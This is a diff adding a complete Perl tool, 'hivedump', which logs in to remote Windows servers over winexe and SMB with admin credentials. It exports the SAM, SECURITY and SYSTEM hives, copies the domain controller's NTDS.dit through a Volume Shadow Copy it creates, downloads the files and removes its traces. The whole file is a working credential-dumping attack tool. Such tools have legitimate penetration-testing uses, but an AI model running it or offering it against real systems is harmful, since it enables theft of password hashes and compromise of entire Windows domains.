@@ -1,0 +1,353 @@
+#!/usr/bin/perl -w
+
+##########################################################################
+#
+#    hivedump: Safely dump credentials in Linux from remote Windows servers 
+#    Copyright (C) 2014 Jonathan Roach
+#
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
+#
+#    Contact: jonnyhightower [at] funkygeek.com
+#
+##########################################################################
+
+use strict;
+
+my ($host,$user,$pass);
+my $UPLOAD="/opt/neet/upload";
+
+if (exists($ENV{'IP'})){
+	($user,$pass)=@ARGV;
+	$host=$ENV{'IP'};
+} else {
+	($host,$user,$pass)=@ARGV;
+}
+
+if (!defined($pass)){
+	print ("$0\n");
+	print ("Usage: $0 [<host>] <user> <password>\n");
+	exit 1;
+}
+my $WorkingDir=$ENV{'PWD'};
+my $REMOTE_DIR="_hivedump";
+my $ERROR=1;
+my $OS="Unidentified\n";
+my $bit=32;
+my (@FILES,@RESULTS);
+
+my $banner="*** $0 -> $host ***";
+
+print "-" x length($banner) . "\n";
+print $banner . "\n";
+
+# Compensate for slashes in domain\username tuplets
+if ($user =~ /\w\\\w/){
+	$user =~ s/(\w)\\(\w)/$1\\\\$2/;
+}
+# And for quotes and shell expansions in passwords
+$pass =~ s/([\"\$])/\\$1/g;
+
+if (!authenticate()){
+	print STDERR "Couldn't authenticate.\n";
+	exit 1;
+}
+
+if (rmkdir()){
+	print "*** Failure to create remote directory. Exiting.\n";
+	exit 1;
+}
+
+check64();
+
+print "->- Detected OS: Windows $OS ($bit bit) -<-\n";
+
+my ($regSuccess,$ADSuccess)=(0,0);
+
+# Test if reg.exe is on the box. If not, upload it
+my $result=rbacktick("reg.exe /?");
+if ($result =~ /is not recognized as an internal or external command/){
+	# No reg
+	print " ~ reg.exe not found on remote host. Uploading our own...\n";
+	push @FILES, "reg/reg.exe";
+	uploadFiles()
+}
+
+for my $hive ("SAM","SECURITY","SYSTEM"){
+	my $result=rbacktick("reg.exe save HKLM\\$hive ${hive}.hive");
+	if ($result =~ /is not recognized as an internal or external command/){
+		last;
+	}
+	if ($result =~ /Access is denied/){
+		print STDERR " - Couldn't export the $hive hive. Access denied.\n";
+		next;
+	}
+	$regSuccess=1;
+	print " + Extracted the $hive hive OK\n";
+	push @RESULTS,$hive . ".hive";
+}
+
+if ($OS =~ /2003/ || $OS =~ /2008/){
+	# See if we can find NTDS.dit and get that using the Volume Shadow Copy Service
+	my $result=rbacktick("vssadmin.exe /?");
+	if ($result =~ /is not recognized as an internal or external command/){
+		print STDERR "Not attempting to get NTDS.dit - no Volume Shadow Copy service available\n";
+	} else {
+		print "   Looking for NTDS.dit\n";
+		my $found=0; my $NTDS;
+		my @paths=("C:\\Windows\\NTDS","D:\\Windows\\NTDS");
+		for my $path (@paths){
+			my $result=rbacktick("dir ${path}\\ntds.dit");
+			#print "Result: $result\n";
+			if ($result =~ /ntds.dit/){
+				$NTDS="${path}\\ntds.dit";
+				$found=1;
+				last;
+			}
+		}
+
+		my ($volume,$vssid,$created)=("","",0);
+		if ($found){
+			print " + Found it at $NTDS\n";
+			my $drive=substr($NTDS,0,1);
+			print "   Searching for Volume Shadow Copy volumes for $drive:\n";
+			my $result=rbacktick("vssadmin list shadows");
+			if ($result =~ /Original Volume: \($drive:\)/) {
+				print " + Found VSS already set up for $drive:\n";
+				for my $line (split "\\n", $result){
+					$line =~ s/\r//;
+					if ($line =~ /Shadow Copy Volume: (\\\\\?\\GLOBALROOT\S+)$/){
+						$volume=$1;
+					}
+					if ($line =~ /Shadow Copy ID: (\{\S+\})$/){
+						$vssid=$1;
+					}
+				}
+
+			} else {
+				# We'll have to set up our own
+				print " - None found. Creating Volume Shadow Copy for $drive:\n";
+				my $result=rbacktick("vssadmin create shadow /for=$drive:");
+				if ($result =~ /Shadow Copy Volume Name: (\\\\\?\\GLOBALROOT\S+)\s/) {
+					$volume=$1;
+					if ($result =~ /Shadow Copy ID: (\{\S+\})/){
+						$vssid=$1;
+					}
+					$created=1;
+					print " + Successfully created VSS volume for $drive:\n";
+				} else {
+					print STDERR "Failed to create VSS for $drive:\n";
+				}
+			}
+
+			if ($volume){
+				print "   > Shadow Copy Volume: $volume\n";
+				print "   > Shadow Copy ID: $vssid\n";
+
+				# Copy the file
+				my $relative=$volume . substr($NTDS,2,length($NTDS)-2);
+				$relative =~ s/\\/\\\\/g;
+				#print " - Copying $relative to \%WINDIR\%\\${REMOTE_DIR}\\\n";
+				print "   Copying NTDS.dit\n";
+				my $result=rbacktick("copy \"$relative\" \%WINDIR\%\\${REMOTE_DIR}\\\\NTDS.dit");
+				#print $result;
+				if (index($result,"1 file(s) copied")){
+					print " + Successfully copied\n";
+					push @RESULTS, "NTDS.dit";
+					$ADSuccess=1;
+				} else {
+					print " - Copy failed! Error message was:";
+					print $result;
+				}
+
+				if ($created){
+					# We'll have to delete the volume we just created
+					print " ! Removing the Shadow Copy Volume $vssid\n";
+					my $result=rbacktick("vssadmin delete shadows /Shadow=$vssid /quiet");
+					if ($result =~ /Error:/) {
+						print "!!! There was an error removing VSS volume $vssid\n";
+						print "    The error message was:\n";
+						print $result;
+					} else {
+						print " + Removed successfully\n";
+					}
+				}
+			} else {
+				print STDERR "!!! Couldn't create a VSS volume for $drive.\n";
+			}
+
+		} else {
+			print "  - Couldn't find it\n";
+
+		}
+	}
+}
+
+
+if ($regSuccess || $ADSuccess){
+	gatherData();
+} else {
+	print STDERR "!!! Couldn't export the registry hives or retrieve NTDS.dit\n.";
+}
+
+cleanup();
+
+my $credit='jonnyhightower [at] funkygeek.com';
+
+print "\n" . "-" x length($credit) . "\n";
+print $credit . "\n\n";
+
+exit $ERROR;
+
+#------------------------------------------------------------------------------------------------------------------------------------------------
+#------------------------------------------------------------------------------------------------------------------------------------------------
+
+sub authenticate {
+	my $return=`winexe --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ver\" 2>&1`;
+
+	if ($return =~ /NT_STATUS_LOGON_FAILURE/i){
+		print STDERR "Logon failure\n";
+		return 0;
+	}
+	if ($return =~ /ERROR/i){
+		return 0;
+	}
+	if ($return !~ /Windows/i){
+		return 0;
+	}
+	if ($return =~ /Windows NT Version 4.0/i){
+		$OS="NT4";
+	} elsif ($return =~ /Windows \[Version 5.2./i){
+		$OS="2003";
+	} elsif ($return =~ /Windows 2000/i){
+		$OS="2000";
+	} elsif ($return =~ /Windows XP/i){
+		$OS="XP";
+	} elsif ($return =~ /Windows \[Version 6.1./i){
+		$OS="2008";
+	} elsif ($return =~ /Windows \[Version 6.0./i){
+		$OS="Vista";
+	}
+	return 1;
+}
+
+sub rbacktick {
+	my $cmd=shift();
+	my @result=`winexe --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\" 2>&1`;
+	return join ("",@result);
+}
+
+sub rexec {
+	my $cmd=shift();
+	my $rc=system("winexe --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\"");
+	$rc=$rc>>8;
+	return $rc;
+}
+
+sub silentRexec {
+	my $cmd=shift();
+	my $rc=system("winexe  --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\" >/dev/null 2>&1");
+	$rc=$rc>>8;
+	return $rc;
+}
+
+sub check64 {
+	my $arch1=`winexe -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ECHO %PROCESSOR_ARCHITECTURE%\" 2>&1`;
+	if ($arch1 =~ /AMD64/i){
+		$bit=64;
+	} 
+	return 1;
+}
+
+sub cleanup {
+	print "*** Cleaning up the remote host $host...\n";
+	# Clean up the winexe service - delete the service
+	#silentRexec("cmd.exe /c ghsc.exe delete winexesvc"); 
+	#silentRexec("cmd.exe /c net stop winexesvc");
+	system("winexe --uninstall --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ver\" >/dev/null 2>&1");
+	for my $file (@FILES){
+		rdel($file);
+	}
+	for my $file (@RESULTS){
+		rdel($file);		
+	}
+	return rrmdir();
+}
+
+sub gatherData {
+	print "*** Retrieving data...\n";
+	for my $file (@RESULTS){
+		print "  > $file\n";
+		download($file);
+	}
+}
+
+sub upload {
+	my $file = shift();
+	my $remote = $file;
+	if ($file =~ /\//){
+		$remote =~ s/^[\S\s]+\/(\S+)$/$1/;
+	}
+	my $rc=1;
+	if (-f "${UPLOAD}/$file"){
+		$rc=system("smbclient //${host}/ADMIN\$ -U \"$user\" \"$pass\" -c \"PUT ${UPLOAD}/$file $REMOTE_DIR\\$remote\" >/dev/null 2>&1");
+		$rc = $rc>>8;
+	}
+	return $rc;
+}
+
+sub download {
+	my $file = shift();
+	my $rc=system("smbclient //${host}/ADMIN\$ -U \"$user\" \"$pass\" -c \"GET $REMOTE_DIR\\$file ${WorkingDir}/$file\" >/dev/null 2>&1");
+	$rc = $rc>>8;
+	return $rc;
+}
+
+sub rdel {
+	my $file=shift();
+	if ($file =~ /\//){
+		$file =~ s/^[\S\s]+\/(\S+)$/$1/;
+	}
+	my $rc=system("smbclient //${host}/ADMIN\$ -U \"$user\" \"$pass\" -c \"DEL $REMOTE_DIR\\$file \" >/dev/null 2>&1");
+	$rc = $rc>>8;
+	return $rc;
+}
+
+sub rmkdir {
+	my $rc=system("smbclient //${host}/ADMIN\$ -U \"$user\" \"$pass\" -c \"MKDIR $REMOTE_DIR\" >/dev/null 2>&1");
+	$rc = $rc>>8;
+	return $rc;
+}
+
+sub rrmdir {
+	my $rc=system("smbclient //${host}/ADMIN\$ -U \"$user\" \"$pass\" -c \"RMDIR $REMOTE_DIR\" >/dev/null 2>&1");
+	$rc = $rc>>8;
+	return $rc;
+}
+
+sub uploadFiles {
+	for my $file (@FILES) {
+		if (upload($file)){
+			print "*** Failed to upload $file\n";
+			$ERROR=1;
+			last;
+		} else {
+			$ERROR=0;
+		}
+	}
+	if ($ERROR){
+		print "*** There was an error during the file upload process.\n";
+		exit 1;
+	}
+}
+
